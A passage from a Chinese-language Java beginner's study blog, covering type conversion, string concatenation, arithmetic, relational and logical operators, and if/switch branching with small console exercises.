class="hljs-number">10</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        数据类型？ c = a + b; <span class="hljs-comment">//小的变大的，这里c为double</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//应注意，byte short char 三种类型的数据在运算时，都会先提升为int，再进行运算</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        数据类型？ c = a + b; <span class="hljs-comment">//这里c为int</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>取值范围：byte &lt; short &lt; int &lt; long &lt; float &lt; double</p><p>数据类型不一样时不能进行计算，转换成一样的才能计算。</p><p>两个转换规则。</p><ul><li>强制转换：取值范围大的数值转换为取值范围小的。</li></ul><blockquote><p>格式：目标数据类型 变量名 &#x3D; （目标数据类型）被强转的数据；</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">double</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">12.3</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) a;<br></code></pre></td></tr></table></figure><p>字符串  “+” 操作：</p><blockquote><p>当 “ + ” 操作中出现字符串时，这个 “ + ”是字符串连接符，而不是算数运算符。会将前后的数据进行拼接，并产生一个新的字符串。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">3.7</span> + <span class="hljs-string">&quot;abc&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-string">&#x27;中&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;我的年龄是：&quot;</span> + age + <span class="hljs-string">&quot;岁&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;我的年龄是：&quot;</span> + <span class="hljs-string">&quot;age&quot;</span> + <span class="hljs-string">&quot;岁&quot;</span>);<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">2</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*3.7abc</span><br><span class="hljs-comment">abctrue</span><br><span class="hljs-comment">中abctrue</span><br><span class="hljs-comment">我的年龄是：18岁</span><br><span class="hljs-comment">我的年龄是：age岁</span><br><span class="hljs-comment">3abc21*/</span><br></code></pre></td></tr></table></figure><p>字符的<code>+</code>操作</p><p>当<code>字符+字符</code>或<code>字符+数字</code>时，会把字符通过<code>ASCII</code>码表查询到对应的数字再进行计算。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">1</span> + <span class="hljs-string">&#x27;a&#x27;</span> );<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> );<span class="hljs-comment">//aabc,有字符串存在就是拼接！</span><br></code></pre></td></tr></table></figure><p>自增自减运算符<code>++,--</code></p><ul><li>单独使用：<code>++</code>和<code>--</code>无论是放在变量前面还是后面，单独写一行结果时一样的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>++a;<span class="hljs-comment">//或者a++</span><br>sout(a)<br><span class="hljs-comment">//11</span><br></code></pre></td></tr></table></figure><ul><li>参与计算</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a++;<span class="hljs-comment">//先用后加，这里b是10,a是11</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> ++a;<span class="hljs-comment">//先加后用，这里b是11，a是11</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x++;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> ++x;<br><br>        System.out.println(<span class="hljs-string">&quot;x: &quot;</span> + x); <span class="hljs-comment">//12</span><br><br>        System.out.println(<span class="hljs-string">&quot;y: &quot;</span> + y); <span class="hljs-comment">//10</span><br><br>        System.out.println(<span class="hljs-string">&quot;z: &quot;</span> + z); <span class="hljs-comment">//12</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>赋值运算符</p><p><img src="/img/javalearn5.png" alt="javalearn5"></p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        a+=b;<span class="hljs-comment">//a+b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a); <span class="hljs-comment">//3</span><br><br>        a-=b;<span class="hljs-comment">//a-b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a*=b;<span class="hljs-comment">//a*b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//2</span><br><br>        a/=b;<span class="hljs-comment">//a/b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a%=b;<span class="hljs-comment">//a%b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br>        <br>        <span class="hljs-comment">//注意：+=。-=，*=。/=,%=底层都隐藏着强制类型转换</span><br>        <span class="hljs-type">short</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">//这时s+=1，不等同于s = s +1，而是s = (short)(s+1)</span><br>        <span class="hljs-comment">//注意short与int相加时会先转成Int，此时s + 1 应该是Int,但却赋值给了一个short类型的变量？</span><br>        <span class="hljs-comment">//</span><br>        <br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>关系运算符</p><p><img src="/img/javalearn6.png" alt="javalearn6"></p><blockquote><p>注意：关系运算符的结果都是boolean类型，即要么true要么false。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        System.out.println(a == b);<span class="hljs-comment">//false</span><br><br>        System.out.println(a == c);<span class="hljs-comment">//true</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入对方分数(0-10)：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你的分数(0-10)：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> num2 &gt;= num1;<br><br>        System.out.println(a);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑运算符</p><p><img src="/img/javalearn7.png" alt="javalearn7"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> ^ <span class="hljs-literal">true</span>);<br><br>        System.out.println(!<span class="hljs-literal">false</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>短路逻辑运算符</p><p><img src="/img/jajvalearn8.png" alt="jajvalearn8"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">```<br><br>```java<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> bianliang1 &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)&#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">false</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><br>        <span class="hljs-type">boolean</span> result = ++a &lt; <span class="hljs-number">5</span> &amp;&amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br><br>        <span class="hljs-type">boolean</span> result2 = ++a &lt; <span class="hljs-number">5</span> &amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">20</span><br><span class="hljs-comment">12</span><br><span class="hljs-comment">21</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个数num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个数num2：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result1</span> <span class="hljs-operator">=</span> num1 == <span class="hljs-number">6</span> || num2 == <span class="hljs-number">6</span>;<br><br>        System.out.println(result1);<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result2</span> <span class="hljs-operator">=</span> (num1 + num2) % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>;<br><br>        System.out.println(result2);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分支结构if"><a href="#分支结构if" class="headerlink" title="分支结构if:"></a>分支结构<code>if</code>:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你口袋里的钱：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (money &gt; <span class="hljs-number">100</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;111&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;222&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你的号码：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number % <span class="hljs-number">2</span>==<span class="hljs-number">1</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;请坐在左边&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;请坐在右边&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;不符合规定！&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入小明的成绩：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number &gt;= <span class="hljs-number">95</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;一等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">94</span> &amp;&amp; number &gt;= <span class="hljs-number">90</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;二等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">89</span> &amp;&amp; number &gt;=<span class="hljs-number">85</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;三等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;无奖&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;请输入合理的成绩！&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分支结构switch"><a href="#分支结构switch" class="headerlink" title="分支结构switch"></a>分支结构<code>switch</code></h4><p><img src="/img/javalearn29.png" alt="javalearn29"></p><p><img src="/img/javalearn30.png" alt="javalearn30"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入面条种类：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">noodles</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (noodles)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;热干面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;兰州拉面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;炸酱面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn22.png" alt="javalearn22"></p><h4 id="default的位置和省略"><a href="#default的位置和省略" class="headerlink" title="default的位置和省略"></a>default的位置和省略</h4><ul><li>default可以写在任意位置，也可以省略不写</li></ul><h4 id="case穿透"><a href="#case穿透" class="headerlink" title="case穿透"></a>case穿透</h4><p>发现<code>break</code>会结束整个<code>switch</code>语句。如果没有发现<code>break</code>，那么程序会执行下一个<code>case</code>的语句体，一直遇到<code>break</code>或大括号为止，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 